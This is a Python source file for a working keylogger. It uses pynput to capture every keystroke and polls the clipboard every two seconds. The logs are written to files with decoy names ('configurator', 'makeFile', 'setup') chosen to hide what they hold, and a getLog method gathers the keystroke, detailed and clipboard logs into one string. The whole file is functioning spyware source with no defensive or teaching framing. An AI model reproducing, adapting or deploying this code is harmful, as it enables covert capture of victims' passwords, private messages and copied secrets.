
#!/usr/bin/env python3
 
from pynput import keyboard
import threading
import pyperclip
import time


class keylogger():
    def __init__(self , debug = True):
        self.alive = False
        self.debug = debug

        self.listener = None
        
        self.keyfileName=  "configurator"
        self.completeFileName = "makeFile"
        self.clipboardFileName = "setup"
        
        self.keyfile = None
        self.completeFile = None
        self.clipboardFile = None
        
        self.keyLogThread = None
        self.clipboardThread = None
        
    
    def openFilesAsA(self):
        self.keyfile =      open(self.keyfileName , "a") 
        self.completeFile = open(self.completeFileName , "a")
    
    def closeFiles(self):
        self.keyfile.close()
        self.completeFile.close()
        
    
    def openFilesAsR(self):
        self.keyfile =      open(self.keyfileName , "r") 
        self.completeFile = open(self.completeFileName , "r")
        
    def openFilesAsW(self):
        self.keyfile =      open(self.keyfileName , "w") 
        self.completeFile = open(self.completeFileName , "w")
        
        
    
    def isAlive(self):
        return self.alive
    
    def removeLastCharacter(self):
        self.closeFiles()
        self.openFilesAsR()
        
        
        keyFileText = self.keyfile.read()
        keyFileText = keyFileText[0:-1]
        
        completeFileText = self.completeFile.read()
        completeFileText = completeFileText
        
       
        
        self.closeFiles()
        
        self.openFilesAsW()
        self.keyfile.write(keyFileText)
        self.completeFile.write(completeFileText)
        self.closeFiles()
        
        self.openFilesAsA()
        
    def getClipboard(self):

        value = ""
        previous= ""        
        while(self.alive):
            self.clipboardFile = open(self.clipboardFileName , "a")
            if pyperclip.paste() != "None":
                value = pyperclip.paste()

                
                
                if str(value) != previous:
                    self.clipboardFile.write(str(value) + "\n")
                    previous = str(value)
            self.clipboardFile.close()
            time.sleep(2)
            
    
    def get_key_name(self , key ):
        
        self.openFilesAsA()
        
        keyfileChar = ""
        compleFileChar = ""
        
        if isinstance(key, keyboard.KeyCode):
            keyfileChar = key.char
            compleFileChar = key.char
        else:
            if(str(key) == "Key.space"):
                keyfileChar = " "
                compleFileChar=  ' [' + str(key) + '] '
            elif(str(key) == "Key.enter"):
                keyfileChar = "\n"
                compleFileChar = ' [' + str(key) + '] \n'
            elif(str(key) == "Key.backspace"):
                self.removeLastCharacter()
                keyfileChar = ""
                compleFileChar = ' [' + str(key) + '] '
            else:
                keyfileChar = ""
                compleFileChar = ' [' + str(key) + '] '
        
        self.keyfile.write(keyfileChar)
        self.completeFile.write(compleFileChar)
        
        self.closeFiles()
        return compleFileChar
        
        
    def on_press(self , key ):
        if not self.alive : 
            return False
        
        key_name = self.get_key_name(key)
        if self.debug:    
            print('Key {} pressed.'.format(key_name))
    
    def on_release(self , key):
        key_name = self.get_key_name(key)
        #print('Key {} released.'.format(key_name))
        """
        if key_name == ' [Key.esc] ':
            print('Exiting...')
            return False
        """    
    
    def startKeyLog(self):
        self.alive=True
        self.listener = keyboard.Listener( on_press= self.on_press)
        self.listener.start()
        
        self.keyLogThread = threading.Thread(target=self.listener.join)
        self.clipboardThread = threading.Thread(target=self.getClipboard)
        
        self.clipboardThread.start()
        self.keyLogThread.start()
        
        
     
    
    def getLog(self):
        
        while 1 :
            try :   
                self.openFilesAsR()
                clipboard = open(self.clipboardFileName , "r")
                
                to_return = " Deatailled log -> " + self.completeFile.read()  + "\nClipboard log -> " + clipboard.read() + "\n\nKeylog ->" + self.keyfile.read()       
                
                self.closeFiles()
                clipboard.close()
                break 
            except :
                print("LOOP")
                pass
        return to_return 
    
    def stopKeyLog(self):
        self.alive = False
    
    